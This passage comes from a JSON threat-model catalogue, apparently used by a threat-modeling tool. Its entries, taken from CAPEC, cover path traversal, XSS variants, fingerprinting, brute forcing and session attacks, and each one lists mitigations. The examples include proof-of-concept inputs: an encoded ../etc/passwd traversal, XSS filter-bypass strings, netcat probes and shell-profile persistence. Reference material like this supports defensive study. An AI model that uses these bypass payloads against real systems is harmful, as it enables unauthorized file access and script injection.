"An attacker exploits a weakness in input validation on the target by supplying a specially constructed path utilizing dot and slash characters for the purpose of obtaining access to arbitrary files or resources. An attacker modifies a known path on the target in order to reach material that is not available through intended channels. These attacks normally involve adding additional path separators (/ or ) and/or dots (.), or encodings thereof, in various combinations in order to reach parent directories or entirely separate trees of the target's directory structure.", "example": "The attacker uses relative path traversal to access files in the application. This is an example of accessing user's password file. http://www.example.com/getProfile.jsp?filename=../../../../etc/passwd However, the target application employs regular expressions to make sure no relative path sequences are being passed through the application to the web page. The application would replace all matches from this regex with the empty string. Then an attacker creates special payloads to bypass this filter: http://www.example.com/getProfile.jsp?filename=%2e%2e/%2e%2e/%2e%2e/%2e%2e /etc/passwd When the application gets this input string, it will be the desired vector by the attacker.", "id": "76", "mitigations": "Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement. Implementation: Perform input validation for all remote content, including remote and user-generated content. Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach. Implementation: Prefer working without user input when using file system calls. Implementation: Use indirect references rather than actual file names. Implementation: Use possible permissions on file access when developing and deploying web applications.", "references": "https://capec.mitre.org/data/definitions/139.html, http://cwe.mitre.org/data/definitions/23.html", "response": "", "severity": "High", "target": "Gateway WS/HTTP Server", "threat_id": "INP11"}, {"assumption": null, "condition": "target.controls.implementsAuthenticationScheme is False", "cvss": "", "description": "Dictionary-based Password Attack", "details": "An attacker tries each of the words in a dictionary as passwords to gain access to the system via some user's account. If the password chosen by the user was a word within the dictionary, this attack will be successful (in the absence of other mitigations). This is a specific instance of the password brute forcing attack pattern.", "example": "A system user selects the word treacherous as their passwords believing that it would be very difficult to guess. The password-based dictionary attack is used to crack this password and gain access to the account.The Cisco LEAP challenge/response authentication mechanism uses passwords in a way that is susceptible to dictionary attacks, which makes it easier for remote attackers to gain privileges via brute force password guessing attacks. Cisco LEAP is a mutual authentication algorithm that supports dynamic derivation of session keys. With Cisco LEAP, mutual authentication relies on a shared secret, the user's logon password (which is known by the client and the network), and is used to respond to challenges between the user and the Remote Authentication Dial-In User Service (RADIUS) server. Methods exist for someone to write a tool to launch an offline dictionary attack on password-based authentications that leverage Microsoft MS-CHAP, such as Cisco LEAP. The tool leverages large password lists to efficiently launch offline dictionary attacks against LEAP user accounts, collected through passive sniffing or active techniques.See also: CVE-2003-1096", "id": "77", "mitigations": "Create a strong password policy and ensure that your system enforces this policy.Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-02.", "references": "https://capec.mitre.org/data/definitions/16.html, http://cwe.mitre.org/data/definitions/521.html, http://cwe.mitre.org/data/definitions/262.html, http://cwe.mitre.org/data/definitions/263.html", "response": "", "severity": "High", "target": "Gateway WS/HTTP Server", "threat_id": "CR03"}, {"assumption": null, "condition": "target.controls.isHardened is False", "cvss": "", "description": "Footprinting", "details": "An adversary engages in probing and exploration activities to identify constituents and properties of the target. Footprinting is a general term to describe a variety of information gathering techniques, often used by attackers in preparation for some attack. It consists of using tools to learn as much as possible about the composition, configuration, and security mechanisms of the targeted application, system or network. Information that might be collected during a footprinting effort could include open ports, applications and their versions, network topology, and similar information. While footprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.", "example": "In this example let us look at the website http://www.example.com to get much information we can about Alice. From the website, we find that Alice also runs foobar.org. We type in www example.com into the prompt of the Name Lookup window in a tool, and our result is this IP address: 192.173.28.130 We type the domain into the Name Lookup prompt and we are given the same IP. We can safely say that example and foobar.org are hosted on the same box. But if we were to do a reverse name lookup on the IP, which domain will come up? www.example.com or foobar.org? Neither, the result is nijasvspirates.org. So nijasvspirates.org is the name of the box hosting 31337squirrel.org and foobar.org. So now that we have the IP, let's check to see if nijasvspirates is awake. We type the IP into the prompt in the Ping window. We'll set the interval between packets to 1 millisecond. We'll set the number of seconds to wait until a ping times out to 5. We'll set the ping size to 500 bytes and we'll send ten pings. Ten packets sent and ten packets received. nijasvspirates.org returned a message to my computer within an average of 0.35 seconds for every packet sent. nijasvspirates is alive. We open the Whois window and type nijasvspirates.org into the Query prompt, and whois.networksolutions.com into the Server prompt. This means we'll be asking Network Solutions to tell us everything they know about nijasvspirates.org. The result is this laundry list of info: Registrant: FooBar (nijasvspirates -DOM) p.o.box 11111 SLC, UT 84151 US Domain Name: nijasvspirates.ORG Administrative Contact, Billing Contact: Smith, John jsmith@anonymous.net FooBar p.o.box 11111 SLC, UT 84151 555-555-6103 Technical Contact: Johnson, Ken kj@fierymonkey.org fierymonkey p.o.box 11111 SLC, UT 84151 555-555-3849 Record last updated on 17-Aug-2001. Record expires on 11-Aug-2002. Record created on 11-Aug-2000. Database last updated on 12-Dec-2001 04:06:00 EST. Domain servers in listed order: NS1. fierymonkey.ORG 192.173.28.130 NS2. fierymonkey.ORG 64.192.168.80 A corner stone of footprinting is Port Scanning. Let's port scan nijasvspirates.org and see what kind of services are running on that box. We type in the nijasvspirates IP into the Host prompt of the Port Scan window. We'll start searching from port number 1, and we'll stop at the default Sub7 port, 27374. Our results are: 21 TCP ftp 22 TCP ssh SSH-1.99-OpenSSH_2.30 25 TCP smtp 53 TCP domain 80 TCP www 110 TCP pop3 111 TCP sunrpc 113 TCP ident Just by this we know that Alice is running a website and email, using POP3, SUNRPC (SUN Remote Procedure Call), and ident.", "id": "78", "mitigations": "Keep patches up to date by installing weekly or daily if possible.Shut down unnecessary services/ports.Change default passwords by choosing strong passwords.Curtail unexpected input.Encrypt and password-protect sensitive data.Avoid including information that has the potential to identify and compromise your organization's security such as access to business plans, formulas, and proprietary documents.", "references": "https://capec.mitre.org/data/definitions/169.html, http://cwe.mitre.org/data/definitions/200.html", "response": "", "severity": "Very Low", "target": "Gateway WS/HTTP Server", "threat_id": "DS03"}, {"assumption": null, "condition": "target.controls.isHardened is False or target.controls.hasAccessControl is False", "cvss": "", "description": "Using Malicious Files", "details": "An attack of this type exploits a system's configuration that allows an attacker to either directly access an executable file, for example through shell access; or in a possible worst case allows an attacker to upload a file and then execute it. Web servers, ftp servers, and message oriented middleware systems which have many integration points are particularly vulnerable, because both the programmers and the administrators must be in synch regarding the interfaces and the correct privileges for each interface.", "example": "Consider a directory on a web server with the following permissions drwxrwxrwx 5 admin public 170 Nov 17 01:08 webroot This could allow an attacker to both execute and upload and execute programs' on the web server. This one vulnerability can be exploited by a threat to probe the system and identify additional vulnerabilities to exploit.", "id": "79", "mitigations": "Design: Enforce principle of least privilegeDesign: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.", "references": "https://capec.mitre.org/data/definitions/17.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/272.html, http://cwe.mitre.org/data/definitions/270.html", "response": "", "severity": "Very High", "target": "Gateway WS/HTTP Server", "threat_id": "AC06"}, {"assumption": null, "condition": "target.controls.validatesHeaders is False or target.controls.encodesOutput is False or target.controls.isHardened is False", "cvss": "", "description": "Web Application Fingerprinting", "details": "An attacker sends a series of probes to a web application in order to elicit version-dependent and type-dependent behavior that assists in identifying the target. An attacker could learn information such as software versions, error pages, and response headers, variations in implementations of the HTTP protocol, directory structures, and other similar information about the targeted service. This information can then be used by an attacker to formulate a targeted attack plan. While web application fingerprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.", "example": "An attacker sends malformed requests or requests of nonexistent pages to the server. Consider the following HTTP responses. Response from Apache 1.3.23$ nc apache.server.com80 GET / HTTP/3.0 HTTP/1.1 400 Bad RequestDate: Sun, 15 Jun 2003 17:12: 37 GMTServer: Apache/1.3.23Connection: closeTransfer: chunkedContent-Type: text/HTML; charset=iso-8859-1 Response from IIS 5.0$ nc iis.server.com 80GET / HTTP/3.0 HTTP/1.1 200 OKServer: Microsoft-IIS/5.0Content-Location: http://iis.example.com/Default.htmDate: Fri, 01 Jan 1999 20:14: 02 GMTContent-Type: text/HTMLAccept-Ranges: bytes Last-Modified: Fri, 01 Jan 1999 20:14: 02 GMTETag: W/e0d362a4c335be1: ae1Content-Length: 133 [R.170.2]", "id": "80", "mitigations": "Implementation: Obfuscate server fields of HTTP response.Implementation: Hide inner ordering of HTTP response header.Implementation: Customizing HTTP error codes such as 404 or 500.Implementation: Hide URL file extension.Implementation: Hide HTTP response header software information filed.Implementation: Hide cookie's software information filed.Implementation: Appropriately deal with error messages.Implementation: Obfuscate database type in Database API's error message.", "references": "https://capec.mitre.org/data/definitions/170.html, http://cwe.mitre.org/data/definitions/497.html", "response": "", "severity": "Low", "target": "Gateway WS/HTTP Server", "threat_id": "HA03"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XSS Targeting Non-Script Elements", "details": "This attack is a form of Cross-Site Scripting (XSS) where malicious scripts are embedded in elements that are not expected to host scripts such as image tags (<img>), comments in XML documents (< !-CDATA->), etc. These tags may not be subject to the same input validation, output validation, and other content filtering and checking routines, so this can create an opportunity for an attacker to tunnel through the application's elements and launch a XSS attack through other elements. As with all remote attacks, it is important to differentiate the ability to launch an attack (such as probing an internal network for unpatched servers) and the ability of the remote attacker to collect and interpret the output of said attack.", "example": "An online discussion forum allows its members to post HTML-enabled messages, which can also include image tags. A malicious user embeds JavaScript in the IMG tags in his messages that gets executed within the victim's browser whenever the victim reads these messages. <img src=javascript:alert('XSS')> When executed within the victim's browser, the malicious script could accomplish a number of adversary objectives including stealing sensitive information such as usernames, passwords, or cookies.", "id": "81", "mitigations": "In addition to the traditional input fields, all other user controllable inputs, such as image tags within messages or the likes, must also be subjected to input validation. Such validation should ensure that content that can be potentially interpreted as script by the browser is appropriately filtered.All output displayed to clients must be properly escaped. Escaping ensures that the browser interprets special scripting characters literally and not as script to be executed.", "references": "https://capec.mitre.org/data/definitions/18.html, http://cwe.mitre.org/data/definitions/80.html", "response": "", "severity": "Very High", "target": "Gateway WS/HTTP Server", "threat_id": "SC02"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False", "cvss": "", "description": "Exploiting Incorrectly Configured Access Control Security Levels", "details": "An attacker exploits a weakness in the configuration of access controls and is able to bypass the intended protection that these measures guard against and thereby obtain unauthorized access to the system or network. Sensitive functionality should always be protected with access controls. However configuring all but the most trivial access control systems can be very complicated and there are many opportunities for mistakes. If an attacker can learn of incorrectly configured access security settings, they may be able to exploit this in an attack. Most commonly, attackers would take advantage of controls that provided too little protection for sensitive activities in order to perform actions that should be denied to them. In some circumstances, an attacker may be able to take advantage of overly restrictive access control policies, initiating denial of services (if an application locks because it unexpectedly failed to be granted access) or causing other legitimate actions to fail due to security. The latter class of attacks, however, is usually less severe and easier to detect than attacks based on inadequate security restrictions. This attack pattern differs from CAPEC 1, Accessing Functionality Not Properly Constrained by ACLs in that the latter describes attacks where sensitive functionality lacks access controls, where, in this pattern, the access control is present, but incorrectly configured.", "example": "For example, an incorrectly configured Web server, may allow unauthorized access to it, thus threaten the security of the Web application.", "id": "82", "mitigations": "Design: Configure the access control correctly.", "references": "https://capec.mitre.org/data/definitions/180.html, http://cwe.mitre.org/data/definitions/732.html", "response": "", "severity": "Medium", "target": "Gateway WS/HTTP Server", "threat_id": "AC07"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.hasAccessControl is False", "cvss": "", "description": "Embedding Scripts within Scripts", "details": "An attack of this type exploits a programs' vulnerabilities that are brought on by allowing remote hosts to execute scripts. The adversary leverages this capability to execute his/her own script by embedding it within other scripts that the target software is likely to execute. The adversary must have the ability to inject their script into a script that is likely to be executed. If this is done, then the adversary can potentially launch a variety of probes and attacks against the web server's local environment, in many cases the so-called DMZ, back end resources the web server can communicate with, and other hosts. With the proliferation of intermediaries, such as Web App Firewalls, network devices, and even printers having JVMs and Web servers, there are many locales where an attacker can inject malicious scripts. Since this attack pattern defines scripts within scripts, there are likely privileges to execute said attack on the host. These attacks are not solely limited to the server side, client side scripts like Ajax and client side JavaScript can contain malicious scripts as well.", "example": "Ajax applications enable rich functionality for browser based web applications. Applications like Google Maps deliver unprecedented ability to zoom in and out, scroll graphics, and change graphic presentation through Ajax. The security issues that an attacker may exploit in this instance are the relative lack of security features in JavaScript and the various browser's implementation of JavaScript, these security gaps are what XSS and a host of other client side vulnerabilities are based on. While Ajax may not open up new security holes, per se, due to the conversational aspects between client and server of Ajax communication, attacks can be optimized. A single zoom in or zoom out on a graphic in an Ajax application may round trip to the server dozens of times. One of the first steps many attackers take is frequently footprinting an environment, this can include scanning local addresses like 192.*.*.* IP addresses, checking local directories, files, and settings for known vulnerabilities, and so on. <IMG SRC=javascript:alert('XSS')> The XSS script that is embedded in a given IMG tag can be manipulated to probe a different address on every click of the mouse or other motions that the Ajax application is aware of. In addition the enumerations allow for the attacker to nest sequential logic in the attacks. While Ajax applications do not open up brand new attack vectors, the existing attack vectors are more than adequate to execute attacks, and now these attacks can be optimized to sequentially execute and enumerate host environments.~/.bash_profile and ~/.bashrc are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. ~/.bash_profile is executed for login shells and ~/.bashrc is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), ~/.bash_profile is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, ~/.bashrc is executed. This allows users more fine grained control over when they want certain commands executed. These files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell.", "id": "83", "mitigations": "Use browser technologies that do not allow client side scripting.Utilize strict type, character, and encoding enforcement.Server side developers should not proxy content via XHR or other means. If a HTTP proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.Ensure all content that is delivered to client is sanitized against an acceptable content specification.Perform input validation for all remote content.Perform output validation for all remote content.Disable scripting languages such as JavaScript in browserSession tokens for specific hostPatching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.Privileges are constrained, if a script is loaded, ensure system runs in chroot jail or other limited authority mode", "references": "https://capec.mitre.org/data/definitions/19.html, http://cwe.mitre.org/data/definitions/284.html", "response": "", "severity": "High", "target": "Gateway WS/HTTP Server", "threat_id": "SC03"}, {"assumption": null, "condition": "target.controls.encodesOutput is False or target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "XSS Targeting Error Pages", "details": "An adversary distributes a link (or possibly some other query structure) with a request to a third party web server that is malformed and also contains a block of exploit code in order to have the exploit become live code in the resulting error page. When the third party web server receives the crafted request and notes the error it then creates an error message that echoes the malformed message, including the exploit. Doing this converts the exploit portion of the message into to valid language elements that are executed by the viewing browser. When a victim executes the query provided by the attacker the infected error message error message is returned including the exploit code which then runs in the victim's browser. XSS can result in execution of code as well as data leakage (e.g. session cookies can be sent to the attacker). This type of attack is especially dangerous since the exploit appears to come from the third party web server, who the victim may trust and hence be more vulnerable to deception.", "example": "A third party web server fails to adequately sanitize messages sent in error pages. Adversary takes advantage of the data displayed in the error message.", "id": "84", "mitigations": "Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and white list any input that will be used in error messages.Implementation: The victim should configure the browser to minimize active content from untrusted sources.", "references": "https://capec.mitre.org/data/definitions/198.html, http://cwe.mitre.org/data/definitions/81.html", "response": "", "severity": "Medium", "target": "Gateway WS/HTTP Server", "threat_id": "DS04"}, {"assumption": null, "condition": "target.controls.sanitizesInput is False or target.controls.validatesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XSS Using Alternate Syntax", "details": "An adversary uses alternate forms of keywords or commands that result in the same action as the primary form but which may not be caught by filters. For example, many keywords are processed in a case insensitive manner. If the site's web filtering algorithm does not convert all tags into a consistent case before the comparison with forbidden keywords it is possible to bypass filters (e.g., incomplete black lists) by using an alternate case structure. For example, the script tag using the alternate forms of Script or ScRiPt may bypass filters where script is the only form tested. Other variants using different syntax representations are also possible as well as using pollution meta-characters or entities that are eventually ignored by the rendering engine. The attack can result in the execution of otherwise prohibited functionality.", "example": "In this example, the attacker tries to get a script executed by the victim's browser. The target application employs regular expressions to make sure no script is being passed through the application to the web page; such a regular expression could be ((?i)script), and the application would replace all matches by this regex by the empty string. An attacker will then create a special payload to bypass this filter: <scriscriptpt>alert(1)</scscriptript> when the applications gets this input string, it will replace all script (case insensitive) by the empty string and the resulting input will be the desired vector by the attacker. In this example, we assume that the application needs to write a particular string in a client-side JavaScript context (e.g., <script>HERE</script>). For the attacker to execute the same payload as in the previous example, he would need to send alert(1) if there was no filtering. The application makes use of the following regular expression as filter ((w+)s*(.*)|alert|eval|function|document) and replaces all matches by the empty string. For example each occurrence of alert(), eval(), foo() or even the string alert would be stripped. An attacker will then create a special payload to bypass this filter: this['al' + 'ert'](1) when the applications gets this input string, it won't replace anything and this piece of JavaScript has exactly the same runtime meaning as alert(1). The attacker could also have used non-alphanumeric XSS vectors to bypass the filter; for example, ($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''+$)[_/_]+$_[+$])])()[__[_/_]+__[_+~$]+$_[_]+$$](_/_) would be executed by the JavaScript engine like alert(1) is.", "id": "85", "mitigations": "Design: Use browser technologies that do not allow client side scripting.Design: Utilize strict type, character, and encoding enforcementImplementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Perform output validation for all remote content.Implementation: Disable scripting languages such as JavaScript in browserImplementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.", "references": "https://capec.mitre.org/data/definitions/199.html, http://cwe.mitre.org/data/definitions/87.html", "response": "", "severity": "High", "target": "Gateway WS/HTTP Server", "threat_id": "SC04"}, {"assumption": null, "condition": "target.controls.usesEncryptionAlgorithm != 'RSA' and target.controls.usesEncryptionAlgorithm != 'AES'", "cvss": "", "description": "Encryption Brute Forcing", "details": "An attacker, armed with the cipher text and the encryption algorithm used, performs an exhaustive (brute force) search on the key space to determine the key that decrypts the cipher text to obtain the plaintext.", "example": "In 1997 the original DES challenge used distributed net computing to brute force the encryption key and decrypt the ciphertext to obtain the original plaintext. Each machine was given its own section of the key space to cover. The ciphertext was decrypted in 96 days.", "id": "86", "mitigations": "Use commonly accepted algorithms and recommended key sizes. The key size used will depend on how important it is to keep the data confidential and for how long.In theory a brute force attack performing an exhaustive key space search will always succeed, so the goal is to have computational security. Moore's law needs to be taken into account that suggests that computing resources double every eighteen months.", "references": "https://capec.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/326.html, http://cwe.mitre.org/data/definitions/327.html, http://cwe.mitre.org/data/definitions/693.html, http://cwe.mitre.org/data/definitions/719.html", "response": "", "severity": "Low", "target": "Gateway WS/HTTP Server", "threat_id": "CR05"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False", "cvss": "", "description": "Manipulate Registry Information", "details": "An adversary exploits a weakness in authorization in order to modify content within a registry (e.g., Windows Registry, Mac plist, application registry). Editing registry information can permit the adversary to hide configuration information or remove indicators of compromise to cover up activity. Many applications utilize registries to store configuration and service information. As such, modification of registry information can affect individual services (affecting billing, authorization, or even allowing for identity spoofing) or the overall configuration of a targeted application. For example, both Java RMI and SOAP use registries to track available services. Changing registry values is sometimes a preliminary step towards completing another attack pattern, but given the long term usage of many registry values, manipulation of registry information could be its own end.", "example": "Manipulating registration information can be undertaken in advance of a path traversal attack (inserting relative path modifiers) or buffer overflow attack (enlarging a registry value beyond an application's ability to store it).", "id": "87", "mitigations": "Ensure proper permissions are set for Registry hives to prevent users from modifying keys.Employ a robust and layered defensive posture in order to prevent unauthorized users on your system.Employ robust identification and audit/blocking via whitelisting of applications on your system. Unnecessary applications, utilities, and configurations will have a presence in the system registry that can be leveraged by an adversary through this attack pattern.", "references": "https://capec.mitre.org/data/definitions/203.html, http://cwe.mitre.org/data/definitions/15.html", "response": "", "severity": "Medium", "target": "Gateway WS/HTTP Server", "threat_id": "AC08"}, {"assumption": null, "condition": "target.controls.providesIntegrity is False or target.controls.usesCodeSigning is False", "cvss": "", "description": "Removing Important Client Functionality", "details": "An attacker removes or disables functionality on the client that the server assumes to be present and trustworthy. Attackers can, in some cases, get around logic put in place to 'guard' sensitive functionality or data. Client applications may include functionality that a server relies on for correct and secure operation. This functionality can include, but is not limited to, filters to prevent the sending of dangerous content to the server, logical functionality such as price calculations, and authentication logic to ensure that only authorized users are utilizing the client. If an attacker can disable this functionality on the client, they can perform actions that the server believes are prohibited. This can result in client behavior that violates assumptions by the server leading to a variety of possible attacks. In the above examples, this could include the sending of dangerous content (such as scripts) to the server, incorrect price calculations, or unauthorized access to server resources.", "example": "Attacker reverse engineers a Java binary (by decompiling it) and identifies where license management code exists. Noticing that the license manager returns TRUE or FALSE as to whether or not the user is licensed, the Attacker simply overwrites both branch targets to return TRUE, recompiles, and finally redeploys the binary.Attacker uses click-through exploration of a Servlet-based website to map out its functionality, taking note of its URL-naming conventions and Servlet mappings. Using this knowledge and guessing the Servlet name of functionality they're not authorized to use, the Attacker directly navigates to the privileged functionality around the authorizing single-front controller (implementing programmatic authorization checks).Attacker reverse-engineers a Java binary (by decompiling it) and identifies where license management code exists. Noticing that the license manager returns TRUE or FALSE as to whether or not the user is licensed, the Attacker simply overwrites both branch targets to return TRUE, recompiles, and finally redeploys the binary.", "id": "88", "mitigations": "Design: For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side.Design: Ship client-side application with integrity checks (code signing) when possible.Design: Use obfuscation and other techniques to prevent reverse engineering the client code.", "references": "http://cwe.mitre.org/data/definitions/602.html", "response": "", "severity": "High", "target": "Gateway WS/HTTP Server", "threat_id": "SC05"}, {"assumption": null, "condition": "target.controls.validatesContentType is False or target.controls.invokesScriptFilters is False", "cvss": "", "description": "XSS Using MIME Type Mismatch", "details": "An adversary creates a file with scripting content but where the specified MIME type of the file is such that scripting is not expected. The adversary tricks the victim into accessing a URL that responds with the script file. Some browsers will detect that the specified MIME type of the file does not match the actual type of its content and will automatically switch to using an interpreter for the real content type. If the browser does not invoke script filters before doing this, the adversary's script may run on the target unsanitized, possibly revealing the victim's cookies or executing arbitrary script in their browser.", "example": "For example, the MIME type text/plain may be used where the actual content is text/javascript or text/html. Since text does not contain scripting instructions, the stated MIME type would indicate that filtering is unnecessary. However, if the target application subsequently determines the file's real type and invokes the appropriate interpreter, scripted content could be invoked.In another example, img tags in HTML content could reference a renderable type file instead of an expected image file. The file extension and MIME type can describe an image file, but the file content can be text/javascript or text/html resulting in script execution. If the browser assumes all references in img tags are images, and therefore do not need to be filtered for scripts, this would bypass content filters.", "id": "89", "mitigations": "Design: Browsers must invoke script filters to detect that the specified MIME type of the file matches the actual type of its content before deciding which script interpreter to use.", "references": "http://cwe.mitre.org/data/definitions/79.html, http://cwe.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/646.html", "response": "", "severity": "Medium", "target": "Gateway WS/HTTP Server", "threat_id": "INP17"}, {"assumption": null, "condition": "target.controls.providesIntegrity is False or target.controls.authenticatesSource is False or target.controls.usesStrongSessionIdentifiers is False", "cvss": "", "description": "Exploitation of Trusted Credentials", "details": "Attacks on session IDs and resource IDs take advantage of the fact that some software accepts user input without verifying its authenticity. For example, a message queuing system that allows service requesters to post messages to its queue through an open channel (such as anonymous FTP), authorization is done through checking group or role membership contained in the posted message. However, there is no proof that the message itself, the information in the message (such group or role membership), or indeed the process that wrote the message to the queue are authentic and authorized to do so. Many server side processes are vulnerable to these attacks because the server to server communications have not been analyzed from a security perspective or the processes trust other systems because they are behind a firewall. In a similar way servers that use easy to guess or spoofable schemes for representing digital identity can also be vulnerable. Such systems frequently use schemes without cryptography and digital signatures (or with broken cryptography). Session IDs may be guessed due to insufficient randomness, poor protection (passed in the clear), lack of integrity (unsigned), or improperly correlation with access control policy enforcement points. Exposed configuration and properties files that contain system passwords, database connection strings, and such may also give an attacker an edge to identify these identifiers. The net result is that spoofing and impersonation is possible leading to an attacker's ability to break authentication, authorization, and audit controls on the system.", "example": "Thin client applications like web applications are particularly vulnerable to session ID attacks. Since the server has very little control over the client, but still must track sessions, data, and objects on the server side, cookies and other mechanisms have been used to pass the key to the session data between the client and server. When these session keys are compromised it is trivial for an attacker to impersonate a user's session in effect, have the same capabilities as the authorized user. There are two main ways for an attacker to exploit session IDs. A brute force attack involves an attacker repeatedly attempting to query the system with a spoofed session header in the HTTP request. A web server that uses a short session ID can be easily spoofed by trying many possible combinations so the parameters session-ID= 1234 has few possible combinations, and an attacker can retry several hundred or thousand request with little to no issue on their side. The second method is interception, where a tool such as wireshark is used to sniff the wire and pull off any unprotected session identifiers. The attacker can then use these variables and access the application.", "id": "90", "mitigations": "Design: utilize strong federated identity such as SAML to encrypt and sign identity tokens in transit.Implementation: Use industry standards session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf.Implementation: If the session identifier is used for authentication, such as in the so-called single sign on use cases, then ensure that it is protected at the same level of assurance as authentication tokens.Implementation: If the web or application server supports it, then encrypting and/or signing the session ID (such as cookie) can protect the ID if intercepted.Design: Use strong session identifiers that are protected in transit and at rest.Implementation: Utilize a session timeout for all sessions, for example 20 minutes. If the user does not explicitly logout, the server terminates their session after this period of inactivity. If the user logs back in then a new session key is generated.Implementation: Verify of authenticity of all session IDs at runtime.", "references": "https://capec.mitre.org/data/definitions/21.html, http://cwe.mitre.org/data/definitions/290.html, http://cwe.mitre.org/data/definitions/346.html, http://cwe.mitre.org/data/definitions/664.html", "response": "", "severity": "High", "target": "Gateway WS/HTTP Server", "threat_id": "AA03"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.authorizesSource is False", "cvss": "", "description": "Functionality Misuse", "details": "An adversary leverages a legitimate capability of an application in such a way as to achieve a negative technical impact. The system functionality is not altered or modified but used in a way that was not intended. This is often accomplished through the overuse of a specific functionality or by leveraging functionality with design flaws that enables the adversary to gain access to unauthorized, sensitive data.", "example": "An attacker clicks on the 'forgot password' and is presented with a single security question. The question is regarding the name of the first dog of the user. The system does not limit the number of attempts to provide the dog's name. An attacker goes through a list of 100 most popular dog names and finds the right name, thus getting the ability to reset the password and access the system.", "id": "91", "mitigations": "Perform comprehensive threat modeling, a process of identifying, evaluating, and mitigating potential threats to the application. This effort can help reveal potentially obscure application functionality that can be manipulated for malicious purposes.When implementing security features, consider how they can be misused and compromised.", "references": "https://capec.mitre.org/data/definitions/212.html", "response": "", "severity": "Medium", "target": "Gateway WS/HTTP Server", "threat_id": "AC09"}, {"assumption": null, "condition": "target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "Fuzzing and observing application log data/errors for application mapping", "details": "An attacker sends random, malformed, or otherwise unexpected messages to a target application and observes the application's log or error messages returned. Fuzzing techniques involve sending random or malformed messages to a target and monitoring the target's response. The attacker does not initially know how a target will respond to individual messages but by attempting a large number of message variants they may find a variant that trigger's desired behavior. In this attack, the purpose of the fuzzing is to observe the application's log and error messages, although fuzzing a target can also sometimes cause the target to enter an unstable state, causing a crash. By observing logs and error messages, the attacker can learn details about the configuration of the target application and might be able to cause the target to disclose sensitive information.", "example": "The following code generates an error message that leaks the full pathname of the configuration file. $ConfigDir = /home/myprog/config;$uname = GetUserInput(username);ExitError(Bad hacker!) if ($uname !~ /^w+$/);$file = $ConfigDir/$uname.txt;if (! (-e $file)) { ExitError(Error: $file does not exist); }... If this code is running on a server, such as a web application, then the person making the request should not know what the full pathname of the configuration directory is. By submitting a username that does not produce a $file that exists, an attacker could get this pathname. It could then be used to exploit path traversal or symbolic link following problems that may exist elsewhere in the application.", "id": "92", "mitigations": "Design: Construct a 'code book' for error messages. When using a code book, application error messages aren't generated in string or stack trace form, but are catalogued and replaced with a unique (often integer-based) value 'coding' for the error. Such a technique will require helpdesk and hosting personnel to use a 'code book' or similar mapping to decode application errors/logs in order to respond to them normally.Design: wrap application functionality (preferably through the underlying framework) in an output encoding scheme that obscures or cleanses error messages to prevent such attacks. Such a technique is often used in conjunction with the above 'code book' suggestion.Implementation: Obfuscate server fields of HTTP response.Implementation: Hide inner ordering of HTTP response header.Implementation: Customizing HTTP error codes such as 404 or 500.Implementation: Hide HTTP response header software information filed.Implementation: Hide cookie's software information filed.Implementation: Obfuscate database type in Database API's error message.", "references": "https://capec.mitre.org/data/definitions/215.html, http://cwe.mitre.org/data/definitions/209.html, http://cwe.mitre.org/data/definitions/532.html", "response": "", "severity": "Low", "target": "Gateway WS/HTTP Server", "threat_id": "INP18"}, {"assumption": null, "condition": "target.controls.implementsServerSideValidation is False and (target.controls.providesIntegrity is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Exploiting Trust in Client", "details": "An attack of this type exploits vulnerabilities in client/server communication channel authentication and data integrity. It leverages the implicit trust a server places in the client, or more importantly, that which the server believes is the client. An attacker executes this type of attack by placing themselves in the communication channel between client and server such that communication directly to the server is possible where the server believes it is communicating only with a valid client. There are numerous variations of this type of attack.", "example": "Web applications may use JavaScript to perform client side validation, request encoding/formatting, and other security functions, which provides some usability benefits and eliminates some client-server round-tripping. However, the web server cannot assume that the requests it receives have been subject to those validations, because an attacker can use an alternate method for crafting the HTTP Request and submit data that contains poisoned values designed to spoof a user and/or get the web server to disclose information.Web 2.0 style applications may be particularly vulnerable because they in large part rely on existing infrastructure which provides scalability without the ability to govern the clients. 